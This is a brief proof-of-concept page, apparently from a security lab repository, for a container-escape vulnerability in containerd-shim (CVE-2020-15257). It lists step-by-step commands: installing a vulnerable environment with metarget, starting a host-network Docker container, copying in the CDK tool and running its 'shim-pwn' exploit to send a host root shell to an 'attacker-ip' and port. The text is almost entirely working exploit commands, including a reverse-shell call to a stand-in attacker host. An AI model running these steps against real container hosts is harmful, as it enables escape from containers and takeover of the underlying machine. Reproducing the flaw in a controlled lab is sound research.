## Proof of Concept

To perform the Proof of Concept, please follow the below steps:

1. Prepare the environment using the following command in metarget's folder<br />
`./metarget ./metarget cnv install cve-2020-15257`
2. Start the container using the following command <br />
 `sudo docker run -it --net=host --name=15257 ubuntu /bin/bash`
3. Pass the cdk executable file in the container /tmp directory and exec into it<br />
  `sudo docker cp cdk_linux_amd64 15257:/tmp` <br />
  `sudo docker exec -it 15257 bash`<br />
4. Run the tool and verify that the host shell is obtained<br />
`cd /tmp`<br />
`./cdk_linux_amd64 run shim-pwn attacker-ip port`<br />
